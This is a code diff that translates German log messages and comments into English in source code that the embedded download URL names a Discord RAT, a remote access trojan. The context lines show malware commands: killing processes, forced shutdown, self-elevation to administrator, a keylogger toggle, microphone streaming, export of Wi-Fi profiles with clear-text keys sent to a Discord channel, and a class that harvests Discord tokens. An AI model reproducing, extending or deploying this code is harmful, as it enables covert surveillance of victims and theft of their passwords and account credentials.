@@ -621,10 +621,10 @@ async def tasklist(ctx):
             await ctx.send(f"```\n{chunk}\n```")
 
         # Log the successful retrieval
-        await log_message(ctx, "Prozessliste abgerufen.")
+        await log_message(ctx, "Process list retrieved.")
 
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Abrufen der Prozessliste: {str(e)}")
+        await log_message(ctx, f"Error retrieving process list: {str(e)}")
 
 
 @bot.command()
@@ -640,31 +640,29 @@ async def taskkill(ctx, identifier: str):
             pid = int(identifier)
             process = psutil.Process(pid)
             process.terminate()
-            await log_message(ctx, f"Prozess mit PID {pid} wurde beendet.")
+            await log_message(ctx, f"Process with PID {pid} has been terminated.")
         except ValueError:
-            # Falls es keine gültige PID ist, versuche, einen Prozess nach Namen zu finden
+            # If it's not a valid PID, try to find a process by name
             process_found = False
             identifier = identifier.lower()  # Vergleiche in Kleinbuchstaben
 
             for proc in psutil.process_iter(["pid", "name"]):
                 proc_name = proc.info["name"].lower()
-                # Überprüfe auch, ob der Prozessname die Eingabe enthält (z.B. "whatsapp.exe" für "WhatsApp")
+                # Also check if the process name contains the input (e.g. "whatsapp.exe" for "WhatsApp")
                 if identifier in proc_name:
                     proc.terminate()
                     await log_message(
                         ctx,
-                        f"Prozess mit Namen {proc_name} (PID {proc.info['pid']}) wurde beendet.",
+                        f"Process with name {proc_name} (PID {proc.info['pid']}) has been terminated.",
                     )
                     process_found = True
                     break
 
             if not process_found:
-                await log_message(
-                    ctx, f"Kein Prozess mit dem Namen {identifier} gefunden."
-                )
+                await log_message(ctx, f"No process with the name {identifier} found.")
 
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Beenden des Prozesses: {str(e)}")
+        await log_message(ctx, f"Error terminating process: {str(e)}")
 
 
 @bot.command()
@@ -676,9 +674,9 @@ async def notify(ctx, title, message):
 
     try:
         notification.notify(title=title, message=message, timeout=10)
-        await log_message(ctx, f"Benachrichtigung gesendet: {title} - {message}")
+        await log_message(ctx, f"Notification sent: {title} - {message}")
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Senden der Benachrichtigung: {str(e)}")
+        await log_message(ctx, f"Error sending notification: {str(e)}")
 
 
 @bot.command()
@@ -693,9 +691,9 @@ async def restart(ctx):
             subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
         else:
             subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
-        await log_message(ctx, "Der PC wird neu gestartet.")
+        await log_message(ctx, "The PC is restarting.")
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Neustarten des PCs: {str(e)}")
+        await log_message(ctx, f"Error restarting the PC: {str(e)}")
 
 
 @bot.command()
@@ -710,9 +708,9 @@ async def shutdown(ctx):
             subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
         else:
             subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
-        await log_message(ctx, "Der PC wird heruntergefahren.")
+        await log_message(ctx, "The PC is shutting down.")
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Herunterfahren des PCs: {str(e)}")
+        await log_message(ctx, f"Error shutting down the PC: {str(e)}")
 
 
 @bot.command()
@@ -725,19 +723,19 @@ async def admin(ctx):
 
     if check_if_admin():
         is_admin = True
-        await log_message(ctx, "Admin-Rechte bereits vorhanden.")
+        await log_message(ctx, "Admin rights already present.")
         return
 
     try:
-        # Starte das Skript als Administrator neu
+        # Restart the script as administrator
         if elevate():
             await log_message(
-                ctx, "Admin-Rechte wurden gewährt. Der alte Prozess wird nun beendet."
+                ctx, "Admin rights granted. The old process will now be terminated."
             )
-            await asyncio.sleep(2)  # Gib Zeit für Logs
-            os._exit(0)  # Beende den alten Prozess sauber
+            await asyncio.sleep(2)  # Give time for logs
+            os._exit(0)  # Terminate the old process cleanly
     except Exception as e:
-        await log_message(ctx, f"Fehler beim Anfordern von Admin-Rechten: {str(e)}")
+        await log_message(ctx, f"Error requesting admin rights: {str(e)}")
 
 
 @bot.command()
@@ -747,7 +745,7 @@ async def stop(ctx):
         await wrong_channel(ctx)
         return
 
-    await log_message(ctx, "Bot wird gestoppt.")
+    await log_message(ctx, "Bot is stopping.")
     await bot.close()
 
 
@@ -760,30 +758,30 @@ async def wifi(ctx):
 
     working_message = await ctx.send("🔄 Working...")
     try:
-        # Erstelle ein temporäres Verzeichnis im temp-Ordner
+        # Create a temporary directory in the temp folder
         export_dir = os.path.join(tempfile.gettempdir(), "SomeStuff")
 
         # Sicherstellen, dass das Exportverzeichnis existiert
         if not os.path.exists(export_dir):
             os.makedirs(export_dir)
 
-        # WLAN-Profile exportieren (inkl. Schlüssel) ohne Konsolenfenster
+        # Export WLAN profiles (incl. keys) without a console window
         subprocess.run(
             ["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_dir}"],
             check=True,
             creationflags=subprocess.CREATE_NO_WINDOW,
         )
 
-        # Alle exportierten XML-Dateien lesen
+        # Read all exported XML files
         xml_files = glob.glob(os.path.join(export_dir, "*.xml"))
         if not xml_files:
             await working_message.delete()
             await send_temporary_message(
-                ctx, "Keine exportierten WLAN-Profile gefunden.", duration=10
+                ctx, "No exported WLAN profiles found.", duration=10
             )
             return
 
-        # Sende die XML-Dateien an den Discord-Channel
+        # Send the XML files to the Discord channel
         for xml_file in xml_files:
             with open(xml_file, "rb") as f:
                 await ctx.send(
@@ -792,13 +790,13 @@ async def wifi(ctx):
 
         await working_message.delete()
         await send_temporary_message(
-            ctx, "WLAN-Profile erfolgreich exportiert und gesendet.", duration=10
+            ctx, "WLAN profiles successfully exported and sent.", duration=10
         )
 
     except Exception as e:
         await working_message.delete()
         await send_temporary_message(
-            ctx, f"Fehler beim Abrufen der WLAN-Profile: {str(e)}", duration=10
+            ctx, f"Error retrieving WLAN profiles: {str(e)}", duration=10
         )
 
 
@@ -973,27 +971,27 @@ async def keylog(ctx, action=None):
 
     if action == "on":
         if keylogger_active:
-            await log_message(ctx, "🔴 **Keylogger ist bereits aktiv.**", duration=10)
+            await log_message(ctx, "🔴 **Keylogger is already active.**", duration=10)
         else:
             keylogger_thread = threading.Thread(target=start_keylogger)
             keylogger_thread.start()
-            await log_message(ctx, "🟢 **Keylogger wurde aktiviert.**")
+            await log_message(ctx, "🟢 **Keylogger has been activated.**")
             # Debugging message
-            print("Keylogger wurde aktiviert.")
+            print("Keylogger activated.")
     elif action == "off":
         if not keylogger_active:
             await log_message(
-                ctx, "🔴 **Keylogger ist bereits deaktiviert.**", duration=10
+                ctx, "🔴 **Keylogger is already deactivated.**", duration=10
             )
         else:
             stop_keylogger()
-            await log_message(ctx, "🔴 **Keylogger wurde deaktiviert.**")
+            await log_message(ctx, "🔴 **Keylogger has been deactivated.**")
             # Debugging message
-            print("Keylogger wurde deaktiviert.")
+            print("Keylogger deactivated.")
     else:
         await log_message(
             ctx,
-            "❌ **Ungültige Aktion. Verwenden Sie `!keylog on` oder `!keylog off`.**",
+            "❌ **Invalid action. Use `!keylog on` or `!keylog off`.**",
             duration=10,
         )
 
@@ -1012,11 +1010,11 @@ async def tts(ctx, *, message):
         engine = pyttsx3.init()
         engine.say(message)
         engine.runAndWait()
-        await log_message(ctx, f"🔊 **Text-to-Speech Nachricht abgespielt:** {message}")
+        await log_message(ctx, f"🔊 **Text-to-Speech message played:** {message}")
     except Exception as e:
         await log_message(
             ctx,
-            f"❌ **Fehler beim Abspielen der Text-to-Speech Nachricht:** {str(e)}",
+            f"❌ **Error playing Text-to-Speech message:** {str(e)}",
             duration=10,
         )
 
@@ -1026,16 +1024,16 @@ async def tts_error(ctx, error):
     if isinstance(error, MissingRequiredArgument):
         await log_message(
             ctx,
-            "❌ **Fehler:** Ein erforderliches Argument fehlt. Bitte geben Sie eine Nachricht an.",
+            "❌ **Error:** A required argument is missing. Please provide a message.",
             duration=10,
         )
     else:
-        await log_message(ctx, f"❌ **Fehler:** {str(error)}", duration=10)
+        await log_message(ctx, f"❌ **Error:** {str(error)}", duration=10)
 
 
 # Function to download libopus if it doesn't exist in the temp directory
 def download_libopus():
-    url = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"  # Ersetzen Sie dies durch eine vertrauenswürdige Quelle
+    url = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"
     temp_dir = tempfile.gettempdir()
     opuslib_path = os.path.join(temp_dir, "libopus.dll")
 
@@ -1043,7 +1041,7 @@ def download_libopus():
         response = requests.get(url)
         with open(opuslib_path, "wb") as file:
             file.write(response.content)
-        print(f"{opuslib_path} heruntergeladen.")
+        print(f"{opuslib_path} downloaded.")
 
     return opuslib_path
 
@@ -1086,14 +1084,14 @@ async def mic_stream_start(ctx):
     # Ensure 'voice' key exists in channel_ids
     if "voice" not in channel_ids:
         await ctx.send(
-            f"`[{current_time()}] Voice-Channel ID ist nicht gesetzt.`", delete_after=10
+            f"`[{current_time()}] Voice channel ID is not set.`", delete_after=10
         )
         return
 
     voice_channel = discord.utils.get(ctx.guild.voice_channels, id=channel_ids["voice"])
     if voice_channel is None:
         await ctx.send(
-            f"`[{current_time()}] Voice-Channel nicht gefunden.`", delete_after=10
+            f"`[{current_time()}] Voice channel not found.`", delete_after=10
         )
         return
 
@@ -1117,7 +1115,7 @@ mic_stream_start.error(generic_command_error)
 async def mic_stream_stop(ctx):
     if ctx.voice_client is None:
         await ctx.send(
-            f"`[{current_time()}] Bot ist in keinem Voice-Channel.`", delete_after=10
+            f"`[{current_time()}] Bot is not in a voice channel.`", delete_after=10
         )
         return
 
@@ -1640,7 +1638,7 @@ class fetch_tokens:
 
     def upload(self, raw_data):
         if not self.tokens:
-            return ["Keine Tokens gefunden."]  # Return a message if no tokens are found
+            return ["No tokens found."]  # Return a message if no tokens are found
 
         final_to_return = []
         for token in self.tokens:
@@ -1742,12 +1740,10 @@ class fetch_tokens:
 
             except requests.exceptions.HTTPError as http_err:
                 print(f"HTTP error occurred: {http_err}")  # Log the HTTP error
-                final_to_return.append(
-                    f"Fehler beim Abrufen der Benutzerdaten: {http_err}"
-                )
+                final_to_return.append(f"Error retrieving user data: {http_err}")
             except Exception as err:
                 print(f"An error occurred: {err}")  # Log any other errors
-                final_to_return.append(f"Ein Fehler ist aufgetreten: {err}")
+                final_to_return.append(f"An error occurred: {err}")
 
         return final_to_return  # Return the final data
 
